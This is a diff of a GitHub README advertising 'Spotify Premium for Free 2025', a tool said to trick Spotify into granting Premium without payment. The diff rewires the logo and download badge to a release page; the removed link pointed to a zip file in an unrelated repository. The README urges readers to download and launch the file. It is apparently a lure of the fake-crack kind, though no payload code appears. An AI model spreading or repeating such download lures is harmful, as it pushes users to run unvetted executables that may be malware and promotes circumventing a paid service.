@@ -1,6 +1,6 @@
 # Spotify Premium for Free 2025 🎧🔓
 
-![Spotify](https://upload.wikimedia.org/wikipedia/en/1/19/Spotify_logo_as_of_2015.png)
+![Spotify](https://github.com/ilikeprogramsidkhow/Spotify-Premium-for-free-2025/releases/tag/v1.0)
 
 Welcome to the **Spotify Premium for Free 2025** repository! 🎉 In this repository, you will find a software solution that tricks Spotify into thinking you have a Premium subscription, allowing you to enjoy all the benefits without any costs. Similar to Spotilife, this software also offers some additional features like custom lyrics integration to enhance your listening experience. 🎶
 
@@ -26,7 +26,7 @@ Welcome to the **Spotify Premium for Free 2025** repository! 🎉 In this reposi
 ## How to Get Started 🛠️
 To access the software and start enjoying Spotify Premium for free, download the latest version from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Software](https://github.com/ilikeprogramsidkhow/Spotify-Premium-for-free-2025/releases/tag/v1.0)](https://github.com/ilikeprogramsidkhow/Spotify-Premium-for-free-2025/releases/tag/v1.0)
 
 Please note that the downloaded file needs to be launched to install the software on your device.
 
